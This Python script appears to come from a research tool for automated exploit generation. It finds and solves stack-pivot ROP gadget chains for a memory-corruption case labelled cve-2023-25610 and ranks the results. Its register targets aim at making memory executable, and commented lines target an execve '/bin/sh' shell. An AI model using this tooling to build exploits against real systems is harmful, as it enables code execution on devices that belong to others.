from pwn import *
from itertools import product
import tools
import solve_engine
import json
from find_stack_pivot_gadget_chain import stack_pivot_gadget_chain
from solve_pivot_mem import solve_mem_gadget_process_func

def info_init_cve(cve_case,binary):
    global gadgets_info
    path_root = "/home/rop"
    gadgets_file = f"{path_root}/my-rop/experiment/{cve_case}/gadget.txt"
    gadgets_data = tools.load_gadget(gadgets_file)
    gadgets_dict = tools.create_gadget_dict(gadgets_data)
    controllable_mem_file_dir = f'{path_root}/my-rop/experiment/{cve_case}/cyclic_matches.json'
    with open(controllable_mem_file_dir, "r", encoding="utf-8") as file:
        controllable_mem_data = json.load(file)
    controllable_mem_data = sorted(controllable_mem_data, key=lambda x: int(x['start_addr'], 16))
    controble_addr_base = int(controllable_mem_data[0]['start_addr'],16)
    # print(f"controble_addr_base: {hex(controble_addr_base)}")
    (permission_table, regs_init) = tools.get_map_regs(f"{path_root}/my-rop/experiment/{cve_case}")

    controllable_regs = eval(open(f"{path_root}/my-rop/experiment/{cve_case}/controble_regs.txt",'r').read())
    binary_file = f'{path_root}/my-rop/experiment/{cve_case}/{binary}'
    try:
        elf = ELF(binary_file,checksec=False)  # 加载目标二进制
        bss_address = elf.bss()  # 获取 .bss 段地址
        if permission_table[0]['start']>>32 > 0:
            bss_address = elf.bss()+permission_table[0]['start']
    except:
        for i in range(len(permission_table)):
            if 'rw' in permission_table[i]['permission'] and permission_table[i]['end'] < controble_addr_base:
                bss_address = permission_table[i]['start']
                break
    # target_regs = [{'reg_name':'rdi','reg_value':bss_address+0x300},{'reg_name':'rsi','reg_value':0},{'reg_name':'rdx','reg_value':0},{'reg_name':'rax','reg_value':59},{'reg_name':'rcx','reg_value':2}]
    target_regs = [{'reg_name':'rdi','reg_value':bss_address+0x300},{'reg_name':'rsi','reg_value':0x1000},{'reg_name':'rdx','reg_value':7},{'reg_name':'rcx','reg_value':10}]

    stack_pivot_chain = []
    
    offset_list = []
    s = 0
    for i in range(len(controllable_mem_data)):
        offset_list += [ _ + s for _ in range(int(controllable_mem_data[i]['length'])//8)]
        if i != len(controllable_mem_data) - 1:
            s = s + (int(controllable_mem_data[i+1]['start_addr'],16) - int(controllable_mem_data[i]['start_addr'],16))//8
    
    address_map = {}
    # target_mem_value = [{bss_address+0x300:b"/bin/sh\x00"}]
    target_mem_value = []
    bss_address += 0x308
    gadgets_info = solve_engine.GadgetsInfo(gadgets_file,regs_init,stack_pivot_chain,gadgets_dict,address_map,offset_list,controllable_mem_data,controble_addr_base,target_regs,target_mem_value,controllable_regs,permission_table,bss_address)

    return gadgets_info
def no_leak_gadget_filter(gadgets_dict, pivot_res):
    res = []
    for i in range(len(pivot_res)):
        flag = True
        address_map = pivot_res[i]['address_map']
        for a, v in address_map.items():
            if v != '0xdeadbeef' and '0x'+v[2:].rjust(16,'0') not in gadgets_dict:
                flag = False
                break
        if flag:
            res.append(pivot_res[i])
    return res
def get_mem_length(gadgets_info, start_addr, mem_data, pivot=False):
    mem_length = 0
    change_sp_max_length = []
    if not pivot:
        for i in range(len(gadgets_info.change_sp_gadget)):
            if len(gadgets_info.change_sp_gadget[i]['side_affect']) == 0 and gadgets_info.change_sp_gadget[i]['change'] not in change_sp_max_length:
                change_sp_max_length.append(gadgets_info.change_sp_gadget[i]['change'])
    else:
        for i in range(len(gadgets_info.change_sp_gadget)):
            if gadgets_info.change_sp_gadget[i]['change'] not in change_sp_max_length:
                change_sp_max_length.append(gadgets_info.change_sp_gadget[i]['change'])
    for i in range(len(mem_data)):
        mem_start_addr = int(mem_data[i]['start_addr'],16)
        length = mem_data[i]['length']
        if start_addr >= mem_start_addr and start_addr < mem_start_addr + length:
            mem_length += (mem_start_addr + length - start_addr)
            start_addr = mem_start_addr + length
        else:
            for j in range(len(change_sp_max_length)):
                if start_addr + change_sp_max_length[j] >= mem_start_addr and start_addr + change_sp_max_length[j] < mem_start_addr + length:
                    mem_length += (mem_start_addr + length - (start_addr + change_sp_max_length[j]))
                    start_addr = mem_start_addr + length
                    break
    return mem_length

    # 给找到的pivot gadget进行排序
def sort_pivot_gadget(pivot_res):
    score_dict = {}
    for i in range(len(pivot_res)):
        f = True
        gadget_chain = pivot_res[i]['gadget_chain']
        n = 0
        length = 0
        for j in range(len(gadget_chain)):
            length += len(gadget_chain[j].split(' -> ')[1].split(" ; "))
            try:
                valid_mem_reg_info = tools.Analysis_gadget(gadget_chain[j].split(' -> ')[1])['valid_mem_reg']
            except:
                f = False
                break
            for k in range(len(valid_mem_reg_info)):
                if valid_mem_reg_info[k]['reg_name'] != 'rsp':
                    n += 1
        if f:
            deadbeef_idx = 0
            for k, v in pivot_res[i]['address_map'].items():
                if v == '0xdeadbeef':
                    deadbeef_idx = k
                    break
            score_dict[i] = (n, length, deadbeef_idx)
    score_dict = sorted(score_dict.items(), key=lambda x: (x[1][2], x[1][0], x[1][1]))
    new_pivot_res = []
    for i in range(len(score_dict)):
        new_pivot_res.append(pivot_res[score_dict[i][0]])
    return new_pivot_res
# def pivot_in_stack(gadgets_info):

from loguru import logger
import time

def main(cve_case,gadgets_info, max_depth = 1,res_json={},num_threads=24,mode=0):
    # logger.add(
    #     sink=f"benchmark_{cve_case}.log",  # 日志文件路径
    #     level="INFO",
    #     encoding="utf-8"
    # )
    GADGETS_FILE = gadgets_info.gadgets_file
    START_DEPTH = 0
    MAX_DEPTH = max_depth
    CONTROLLABLE_REGS = gadgets_info.controllable_regs
    if len(CONTROLLABLE_REGS) == 0:
        # 若没有寄存器指向可控内存，需要从栈内存中找可控内存，给到寄存器，直接给rsp或者给其他寄存器，但需要保持控制流可控
        pass
    controllable_mem_data = gadgets_info.controllable_mem_data

    reg_controllable_mem_length_dict = {}
    for i in range(len(CONTROLLABLE_REGS)):
        reg_value = gadgets_info.regs_init[CONTROLLABLE_REGS[i]]
        reg_controllable_mem_length_dict[CONTROLLABLE_REGS[i]] = get_mem_length(gadgets_info, reg_value, controllable_mem_data, pivot=True)
    logger.debug(f"{reg_controllable_mem_length_dict}")
    CONTROLLABLE_REG = max(reg_controllable_mem_length_dict, key=reg_controllable_mem_length_dict.get)
    # logger.info("Start Find Stack Pivot Gadet Chain")
    start = time.time()
    found_chains = stack_pivot_gadget_chain(
        GADGETS_FILE, START_DEPTH, MAX_DEPTH, CONTROLLABLE_REG, num_threads=num_threads
    )
    logger.debug(len(found_chains))
    # print(found_chains)
    res_json["Find Time"] = time.time()-start
    logger.debug(f"Finish Find Stack Pivot Gadget Chain")
    regs = gadgets_info.regs_init
    controble_addr_base = gadgets_info.controble_addr_base 
    offset_list = gadgets_info.offset_list
    permission_table = gadgets_info.permission_table
    stack_mem = gadgets_info.stack_mem
    logger.debug("Start Solve Stack Pivot Gadget Chain")
    start = time.time()
    pivot_res = solve_mem_gadget_process_func(regs,found_chains,controble_addr_base,offset_list,permission_table,num_threads,stack_mem=stack_mem,mode=mode)
    # print(pivot_res)
    res_json["Solve Time"] = time.time()-start
    logger.debug(f"Finsh Solve Stack Pivot Gadget Chain")
    logger.success(f"Find and Solve Pivot Gadget Chain Time : {res_json["Solve Time"]}")
    no_addr_leak = False
    if cve_case == 'ccb-2024-final-NFS-Heap':
        no_addr_leak = False
    if no_addr_leak:
        no_leak_gadget = no_leak_gadget_filter(gadgets_info.gadgets_dict, pivot_res)
        no_leak_gadget = sort_pivot_gadget(no_leak_gadget)
        return no_leak_gadget
    else:
        pivot_res = sort_pivot_gadget(pivot_res)
        return pivot_res
     
if __name__ == "__main__":
    # binary = 'pwn'
    binary = 'init'
    # cve_case = 'ccb-2024-final-NFS-Heap'
    cve_case = 'cve-2023-25610'
    gadgets_info = info_init_cve(cve_case,binary)
    res_json={}
    print(main(cve_case,gadgets_info,1,res_json=res_json))